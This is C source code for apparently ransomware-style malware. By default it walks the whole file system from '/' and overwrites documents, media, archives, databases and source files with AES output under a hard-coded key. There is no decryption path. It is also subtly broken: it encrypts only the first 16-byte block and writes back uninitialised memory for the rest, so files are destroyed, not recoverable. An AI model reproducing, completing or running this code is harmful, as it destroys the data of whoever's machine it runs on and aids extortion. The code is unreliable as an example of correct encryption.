#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <ftw.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>
#include <openssl/aes.h>

struct filez {
    const unsigned char *buffer;
    size_t size;
};
typedef struct filez Filez;

int readFile(const char *);
void writeFile(const char *, const unsigned char *, size_t);
void encryptFile(const char *);
int listFiles(const char *, const struct stat *, int);
int checkExtension(const char *);

Filez file;
const unsigned char encryptionKey[] = "85Noi4Jmu63333NOvNKsKysVeZ612357hhdr66vyUA5RGO9VlH566zyy6d61w4MV6nh23516dJ";
const char *allowedExtensions[] = {
    ".doc", ".odt", ".rtf", ".md", ".wpd", ".ppt", ".pps", ".odp", ".key", ".ods",
    ".xlr", ".xls", ".txt", ".pdf", ".zip", ".jpeg", ".jpg", ".png", ".gif", ".bmp",
    ".psd", ".ico", ".svg", ".tif", ".mp3", ".flac", ".aif", ".wav", ".wma", ".ogg",
    ".mpa", ".cda", ".mp4", ".wmv", ".mpg", ".mpeg", ".m4v", ".h264", ".mkv", ".3g2",
    ".3gp", ".avi", ".mov", ".flv", ".7z", ".tar", ".rar", ".gz", ".db", ".dbf", ".db3",
    ".docx", ".xlsx", ".ppt", ".pptx", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp",
    ".yml", ".aspx", ".js", ".jsp", ".css", ".aspx", ".xhtml", ".html", ".json",
    ".xml", ".bz2", ".bak", ".sqlitedb", ".sqlite", ".java", ".class", ".jar"
};

int main(int argc, const char *argv[]) {
    const char *path;
    if (argc == 1) {
        path = "/";
    } else if (argc == 2) {
        path = argv[1];
    } else {
        printf("Modo de uso: %s <diretorio>\n", argv[0]);
        return 1;
    }
    ftw(path, listFiles, 1);

    return 0;
}

void encryptFile(const char *filename) {
    if (readFile(filename) == 1) {
        return;
    }

    // Criptografia AES-256
    const int AES_KEY_SIZE = 256;
    unsigned char key[AES_KEY_SIZE/8];
    memcpy(key, encryptionKey, AES_KEY_SIZE/8);
    AES_KEY aesKey;
    AES_set_encrypt_key(key, AES_KEY_SIZE, &aesKey);

    unsigned char *encryptedBuffer = (unsigned char *)malloc(file.size);
    AES_encrypt(file.buffer, encryptedBuffer, &aesKey);

    writeFile(filename, encryptedBuffer, file.size);

    free((unsigned char *)file.buffer);
    free(encryptedBuffer);
}

int listFiles(const char *name, const struct stat *status, int type) {
    if (type == FTW_NS)
        return 0;

    if (type == FTW_F) {
        if (strstr(name, "/.") == NULL) {
            if (checkExtension(name) == 0) {
                encryptFile(name);
            }
        }
    }

    return 0;
}

int checkExtension(const char *name) {
    int numExtensions = sizeof(allowedExtensions) / sizeof(allowedExtensions[0]);
    for (int i = 0; i < numExtensions; i++) {
        if (strcasestr(name, allowedExtensions[i]) != NULL) {
            return 0;
        }
    }
    return 1;
}

void writeFile(const char *name, const unsigned char *content, size_t size) {
    FILE *fp = fopen(name, "wb");
    if (fp == NULL) {
        return;
    }
    fwrite(content, 1, size, fp);
    fclose(fp);
}

int readFile(const char *name) {
    FILE *fp = fopen(name, "rb");
    if (fp == NULL) {
        return 1;
    }
    fseek(fp, 0, SEEK_END);
    file.size = ftell(fp);
    rewind(fp);
    file.buffer = (const unsigned char *)malloc(file.size * sizeof(unsigned char));
    fread((unsigned char *)file.buffer, 1, file.size, fp);
    fclose(fp);
    return 0;
}
